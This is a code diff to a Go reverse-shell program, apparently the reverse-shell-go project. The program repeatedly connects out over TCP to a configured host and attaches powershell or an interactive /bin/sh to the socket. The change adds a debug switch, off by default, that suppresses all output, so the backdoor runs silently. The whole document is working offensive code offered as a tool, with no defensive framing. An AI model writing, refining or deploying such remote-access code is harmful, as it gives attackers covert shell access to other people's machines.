@@ -8,11 +8,20 @@ import (
 	"time"
 )
 
+// delay sets the time period between connection attempts
 const delay = 5
+
+// host sets the address of the server to connect to
 const host = "127.0.0.1:8080"
 
+// debug sets if program should provide output
+const debug = false
+
 func main() {
-	fmt.Println("github.com/orf1/reverse-shell-go")
+	if debug {
+		Println("starting in debug mode")
+	}
+	Println("github.com/orf1/reverse-shell-go")
 	for {
 		time.Sleep(delay * time.Second)
 		connect()
@@ -22,13 +31,13 @@ func main() {
 // connect attempts to send a shell to a remote server
 func connect() {
 	// attempts to establish a tcp connection with server
-	fmt.Println("attempting to establish tcp connection with server")
+	Println("attempting to establish tcp connection with server")
 	con, err := net.Dial("tcp", host)
 	if err != nil {
-		fmt.Println(err)
+		Println(err.Error())
 		return
 	}
-	fmt.Println("connection established")
+	Println("connection established")
 
 	cmd := getOsCmd()
 
@@ -39,22 +48,28 @@ func connect() {
 	cmd.Stderr = con
 
 	// opens shell
-	fmt.Println("shell opened")
+	Println("shell opened")
 	err = cmd.Run()
 	if err != nil {
-		fmt.Println(err)
+		Println(err.Error())
 		return
 	}
-	fmt.Println("shell closed")
+	Println("shell closed")
 }
 
 func getOsCmd() *exec.Cmd {
-	fmt.Println("detecting operating system")
+	Println("detecting operating system")
 	if runtime.GOOS == "windows" {
-		fmt.Println("detected windows, using powershell")
+		Println("detected windows, using powershell")
 		return exec.Command("powershell")
 	} else {
-		fmt.Println("detected mac or linux, using /bin/sh")
+		Println("detected mac or linux, using /bin/sh")
 		return exec.Command("/bin/sh", "-i")
+	}
+}
+
+func Println(text string) {
+	if debug {
+		fmt.Println(text)
 	}
 }
